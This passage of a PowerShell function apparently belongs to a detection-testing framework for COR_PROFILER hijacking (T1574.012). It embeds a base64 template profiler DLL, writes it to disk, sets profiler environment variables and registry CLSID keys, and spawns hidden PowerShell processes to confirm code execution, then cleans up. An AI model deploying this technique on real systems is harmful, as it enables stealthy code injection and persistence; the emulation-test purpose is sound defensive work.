ABQnAADgHQAA+B0AAHQnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAYAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQACAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAJBAAASAAAAGBQAACRAAAAAAAAAAAAAAAAAAAAAAAAADw/eG1sIHZlcnNpb249JzEuMCcgZW5jb2Rpbmc9J1VURi04JyBzdGFuZGFsb25lPSd5ZXMnPz4NCjxhc3NlbWJseSB4bWxucz0ndXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEnIG1hbmlmZXN0VmVyc2lvbj0nMS4wJz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAACQAAADooPCg+KAAoQihWKFgoZiisKK4olijYKNoo3CjAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=')

    # Offset to the template GUID in the binary above. The template GUID will be replaced with the test GUID.
    $GuidOffset = 0x1390

    # Use a template profiler dll if one wasn't supplied
    if ($ProfilerPath) {
        $TargetPath = Resolve-ProfilerPath -InputPath $ProfilerPath
        $UseTemplateExecutable = $False
    } else {
        $UseTemplateExecutable = $True

        if ([IntPtr]::Size -eq 4) {
            Write-Error 'The template profiler DLL is not supported in 32-bit PowerShell. You can supply your own profiler DLL using the -ProfilerPath parameter.'
    
            return
        }

        $TargetPath = Resolve-ProfilerPath -InputPath 'Profiler.dll'
        $SourceDllBytes = $TemplateSourceBytes
        
        $GuidBytes = [Text.Encoding]::ASCII.GetBytes($TestGuid)

        # Replace the template GUID "AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA" in the test executable with the test GUID.
        for ($i = 0; $i -lt $GuidBytes.Length; $i++) {
            $SourceDllBytes[($GuidOffset + $i)] = $GuidBytes[$i]
        }
       [IO.File]::WriteAllBytes($TargetPath, $SourceDllBytes)
    }

    # Ensure a valid path to the profiler DLL is supplied before we change any environment variables
    if (-not (Test-Path $TargetPath)) {
        Write-Error "Cannot Resolve supplied profiler path."
        return
    }

    # Calculate the checksum of the profiler dll
    $SourceDllHash = Get-FileHash -Algorithm SHA256 -Path $TargetPath

    # check the current state of environment vairables
    # Validate to see if the %COR_ENABLE_PROFILING% already exists
    if (-not (Get-EnvVar -EnvVar 'COR_ENABLE_PROFILING' -Scope $ProfilerScope)) {
        $ProfilingEnvVarPreviouslySet = $False
    }
    else {
        $ProfilingEnvVarPreviouslySet = $True
    }

    # Validate to see if the %COR_PROFILER% already exists
    if (-not (Get-EnvVar -EnvVar 'COR_PROFILER' -Scope $ProfilerScope)) {
        $ProfilerCLSIDEnvVarPreviouslySet = $False
    }
    else {
        $ProfilerCLSIDEnvVarPreviouslySet = $True
    }
    # Validate to see if the %COR_PROFILER_PATH% already exists
    if (-not (Get-EnvVar -EnvVar 'COR_PROFILER_PATH' -Scope $ProfilerScope)) {
        $ProfilerPathEnvVarPreviouslySet = $False
    }
    else {
        $ProfilerPathEnvVarPreviouslySet = $True
    }

    # If %COR_ENABLE_PROFILING% does not exist, set it. Or set it regardless if we are Forcing.
    if (-not $ProfilingEnvVarPreviouslySet) {
        Set-EnvVar -EnvVar 'COR_ENABLE_PROFILING' -Scope $ProfilerScope -EnvVarValue 1 
    } else {
        Write-Verbose '%COR_ENABLE_PROFILING% is already set.'

        if ($Force) {
            Write-Verbose 'Overriding existing %COR_ENABLE_PROFILING variable'

            Set-EnvVar -EnvVar 'COR_ENABLE_PROFILING' -Scope $ProfilerScope -EnvVarValue 1 
        } else {
        Write-Error '%COR_ENABLE_PROFILING% is already set and will not be overridden. Use -Force to override any existing %COR_ENABLE_PROFILING% variable'
        }
    }

    # Format the Profiler CLSID
    $ProfilerCLSIDFormatted = "{$ProfilerCLSID}" 
    
    # if %COR_PROFILER% does not exist, set it. Or set it regardless if we are Forcing.
    if (-not ($ProfilerCLSIDEnvVarPreviouslySet)) {
        Set-EnvVar -EnvVar 'COR_PROFILER' -EnvVarValue $ProfilerCLSIDFormatted -Scope $ProfilerScope
    } else {
        Write-Verbose '%COR_PROFILER% is already set'
        if ($Force) {
            Write-Verbose "Overriding existing %COR_PROFILER% variable"

            Set-EnvVar -EnvVar 'COR_PROFILER' -EnvVarValue $ProfilerCLSIDFormatted -Scope $ProfilerScope
        } else {
            Write-Error '%COR_PROFILER% is already set and will not be overridden. Use -Force to override any existing %COR_PROFILER% variable'
        }
    }

    # if %COR_PROFILER_PATH% does not exist, set it. Or set it regardless if we are Forcing.
    if (-not ($ProfilerPathEnvVarPreviouslySet)) {
        Set-EnvVar -EnvVar 'COR_PROFILER_PATH' -EnvVarValue $TargetPath -Scope $ProfilerScope
    } else {
        Write-Verbose '%COR_PROFILER_PATH% is already set'
        if ($Force) {
            Write-Verbose "Overriding existing %COR_PROFILER_PATH% variable"

            Set-EnvVar -EnvVar 'COR_PROFILER_PATH' -EnvVarValue $TargetPath -Scope $ProfilerScope
        } else {
            Write-Error '%COR_PROFILER_PATH% is already set and will not be overridden. Use -Force to override any existing %COR_PROFILER% variable'
        }
    }

    if ($ProfilerType -eq 'Registered') {
        switch ($ProfilerScope) {
            'Machine'
            {
                $RegHive = [string]"HKLM:\SOFTWARE\Classes\CLSID"
            }
            'User'
            {
                $RegHive = [string]"HKCU:\Software\Classes\CLSID"
            }
        }
        $RegPath = [string]::Format("{0}\{1}\{2}", $RegHive, $ProfilerCLSIDFormatted, 'InprocServer32')
        Write-Verbose ([string]::Format("Registering Profiler Dll with CLSID {0} in: {1}", $ProfilerCLSIDFormatted, $RegPath))
        New-Item -Path $RegPath -Value $TargetPath -Force | Out-Null
    }
    

    # Remove any extra ChildProcSpawned events
    Unregister-Event -SourceIdentifier 'ProcessSpawned' -ErrorAction SilentlyContinue
    Get-Event -SourceIdentifier 'ChildProcSpawned' -ErrorAction SilentlyContinue | Remove-Event
    
    # Trigger an event any time cmd.exe has $TestGuid in the command line.
    $WMIEventQuery = "SELECT * FROM __InstanceCreationEvent WITHIN .1 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'cmd.exe' AND TargetInstance.CommandLine LIKE '%$($TestGuid)%'"

    Write-Verbose "Registering CMD child process creation WMI event using the following WMI event query: $WMIEventQuery"

    $null = Register-CimIndicationEvent -SourceIdentifier 'ProcessSpawned' -Query $WMIEventQuery -Action {
        $ParentProcessID = $EventArgs.NewEvent.TargetInstance.ParentProcessId

        $ParentProcess = Get-CimInstance -ClassName 'Win32_Process' -Filter "ProcessId = $ParentProcessID"
        $ExecutableFileInfo = Get-Item -Path $ParentProcess.ExecutablePath

        $SpawnedProcInfo = [PSCustomObject] @{
            ProcessId = $EventArgs.NewEvent.TargetInstance.ProcessId
            ProcessCommandLine = $EventArgs.NewEvent.TargetInstance.CommandLine
            ParentProcessId = $ParentProcessID
            ParentProcessCommandLine = $ParentProcess.CommandLine
            ParentPath = $ParentProcess.Path
        }

        if (@('POWERSHELL', 'powershell.exe') -contains $ExecutableFileInfo.VersionInfo.InternalName) {
            # Signal that the child proc was spawned and surface the relevant into to Wait-Event
            New-Event -SourceIdentifier 'ChildProcSpawned' -MessageData $SpawnedProcInfo
        }
    }

    # Create a process that loads the CLR. In order to test User and Machine scoped profilers it's easier to create a process off of wmiprvse.exe which updates those environment variables frequently. 
    if ($ProfilerScope -eq "Process") {
        $procStartInfo = [System.Diagnostics.ProcessStartInfo]::new("powershell.exe")
        $procStartInfo.CreateNoWindow = $True
        $procStartInfo.UseShellExecute = $false
        $TargetProcessStartResults = [System.Diagnostics.Process]::Start($procStartInfo)
    } else {
        $ProcessStartup = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly
        $ProcessStartupInstance = Get-CimInstance -InputObject $ProcessStartup
        $ProcessStartupInstance.ShowWindow = [UInt16] 0 # Hide the window
        $PowershellCommandLine = "powershell.exe"
        $WMITargetProcessStartResults = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $PowershellCommandLine; ProcessStartupInformation = $ProcessStartupInstance }
    }

    $ChildProcSpawnedEvent = Wait-Event -SourceIdentifier 'ChildProcSpawned' -Timeout 8
    $ChildProcInfo = $null

    if ($ChildProcSpawnedEvent) {
        $TestSuccess = $True

        $ChildProcInfo = $ChildProcSpawnedEvent.MessageData
        $ParentProcessId = $ChildProcInfo.ParentProcessId
        $ParentProcessCommandLine = $ChildProcInfo.ParentProcessCommandLine
        $SpawnedProcCommandLine = $ChildProcInfo.ProcessCommandLine
        $SpawnedProcProcessId = $ChildProcInfo.ProcessId
        $ParentProcessPath = $ChildProcInfo.ParentPath

        $ChildProcSpawnedEvent | Remove-Event
    } else {
        Write-Error "cmd.exe child process was not spawned."
        $TestSuccess = $False
    }

    # retrieve relevant registry artifiacts
    if ($ProfilerType -eq 'Registered') {
        $RegisteredProfilerKey = Get-Item -Path $RegPath
        $RegisterdProfilerValue = Get-ItemProperty -Path $RegPath

        $RegisteredProfilerRegistryArtifactsInfo = [PSCustomObject] @{
            RegisteredProfilerRegCOMClass = $RegisteredProfilerKey.Name
            RegisteredProfilerRegCOMClassPathValue  = $RegisterdProfilerValue.'(default)'
        }
    } 

    switch ($ProfilerScope) {
        'Machine'
        {
            $ProfilerRegistryEnvVarKeyPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\"
            $ProfilerRegistryrEnvVarsValues = Get-ItemProperty -Path $ProfilerRegistryEnvVarKeyPath
            $ProfilerRegistryEnvVarPath =  Get-Item -Path $ProfilerRegistryEnvVarKeyPath
            $ProfilerRegistryEnvVarValueNames = $ProfilerRegistryEnvVarPath | Select-Object -Property Property
             
            if ($ProfilerRegistryEnvVarValueNames.Property.Contains('COR_ENABLE_PROFILING')) {
                $CorEnableProfilingValueName = 'COR_ENABLE_PROFILING'
            }

            if ($ProfilerRegistryEnvVarValueNames.Property.Contains('COR_PROFILER')) {
                $CorProfilerValueName = 'COR_PROFILER'
            }

            if ($ProfilerRegistryEnvVarValueNames.Property.Contains('COR_PROFILER_PATH')) {
                $CorProfilerPathValueName = 'COR_PROFILER_PATH'
            }
        }
        'User'
        {
            $ProfilerRegistryEnvVarKeyPath = "HKCU:\Environment\"
            $ProfilerRegistryrEnvVarsValues = Get-ItemProperty -Path $ProfilerRegistryEnvVarKeyPath
            $ProfilerRegistryEnvVarPath =  Get-Item -Path $ProfilerRegistryEnvVarKeyPath
            $ProfilerRegistryEnvVarValueNames = $ProfilerRegistryEnvVarPath | Select-Object -Property Property
             
            if ($ProfilerRegistryEnvVarValueNames.Property.Contains('COR_ENABLE_PROFILING')) {
                $CorEnableProfilingValueName = 'COR_ENABLE_PROFILING'
            }

            if ($ProfilerRegistryEnvVarValueNames.Property.Contains('COR_PROFILER')) {
                $CorProfilerValueName = 'COR_PROFILER'
            }

            if ($ProfilerRegistryEnvVarValueNames.Property.Contains('COR_PROFILER_PATH')) {
                $CorProfilerPathValueName = 'COR_PROFILER_PATH'
            }
        }
    }


    # Cleanup
    Unregister-Event -SourceIdentifier 'ProcessSpawned'

    # Remove any processes we started
    if ($TargetProcessStartResults.HasExited -eq $False) {
        Write-Verbose ([string]::Format("Stopping the target powershell process with id: {0}", $TargetProcessStartResults.Id))
        Stop-Process -Id $TargetProcessStartResults.Id -ErrorAction SilentlyContinue
    }
    if ($WMITargetProcessStartResults.ProcessId) {
        Write-Verbose ([string]::Format("Stopping the target powershell process with id: {0}", $WMITargetProcessStartResults.ProcessId))
        Stop-Process -Id $WMITargetProcessStartResults.ProcessId -ErrorAction SilentlyContinue
    }

    # Remove any environment variables we set
    if (-not $ProfilingEnvVarPreviouslySet) {
        Remove-EnvVar -EnvVar 'COR_ENABLE_PROFILING' -scope $ProfilerScope
    }

    if (-not $ProfilerCLSIDEnvVarPreviouslySet) {
        Remove-EnvVar -EnvVar 'COR_PROFILER' -scope $ProfilerScope
    }

    if (-not $ProfilerPathEnvVarPreviouslySet) {
        Remove-EnvVar -EnvVar 'COR_PROFILER_PATH' -scope $ProfilerScope
    }

    # Remove template profiler dll if we wrote one to disk
    if ($UseTemplateExecutable) {
        [System.IO.File]::Delete($TargetPath)
        Write-Verbose ([string]::Format("Removed template profiler Dll: {0}", $TargetPath))
    }

    if ($ProfilerType -eq 'Registered') {
        $RegPath = [string]::Format("{0}\{1}", $RegHive, $ProfilerCLSIDFormatted)
        Write-Verbose ([string]::Format("Removing registered Profiler Dll with CLSID {0} in: {1}", $ProfilerCLSIDFormatted, $RegPath))
        Remove-Item -Path $RegPath -Recurse -Force -ErrorAction Ignore | Out-Null
    }

    [PSCustomObject] @{
        TechniqueID                                 = 'T1574.012'
        TestSuccess                                 = $TestSuccess
        TestGuid                                    = $TestGuid
        ProfilerScope                               = $ProfilerScope
        ProfilerType                                = $ProfilerType
        ProfilerCLSID                               = $ProfilerCLSIDFormatted
        ProfilerDllPath                             = $TargetPath
        ProfilerDllFileSHA256Hash                   = $SourceDllHash.Hash
        TargetProcessId                             = $ParentProcessId
        TargetProcessPath                           = $ParentProcessPath
        TargetProcessCommandLine                    = $ParentProcessCommandLine
        ChildProcessId                              = $SpawnedProcProcessId
        ChildProcessCommandLine                     = $SpawnedProcCommandLine
        RegisteredProfilerRegistryCOMClassValueName = $RegisteredProfilerRegistryArtifactsInfo.RegisteredProfilerRegCOMClass
        RegisteredProfilerRegistryCOMClassNameValue = $RegisteredProfilerRegistryArtifactsInfo.RegisteredProfilerRegCOMClassPathValue
        CorEnableProfilingEnvVarRegistrySubKey      = $ProfilerRegistryEnvVarPath.Name
        CorEnableProfilingEnvVarRegistryValueName   = $CorEnableProfilingValueName
        CorEnableProfilingEnvVarRegistryNameValue   = $ProfilerRegistryrEnvVarsValues.COR_ENABLE_PROFILING
        CorProfilerEnvVarRegistrySubKey             = $ProfilerRegistryEnvVarPath.Name
        CorProfilerEnvVarRegistryValueName          = $CorProfilerValueName
        CorProfilerEnvVarRegistryNameValue          = $ProfilerRegistryrEnvVarsValues.COR_PROFILER
        CorProfilerPathEnvVarRegistrySubKey         = $ProfilerRegistryEnvVarPath.Name
        CorProfilerPathEnvVarRegistryValueName      = $CorProfilerPathValueName
        CorProfilerPathEnvVarRegistryNameValue      = $ProfilerRegistryrEnvVarsValues.COR_PROFILER_PATH
    }
}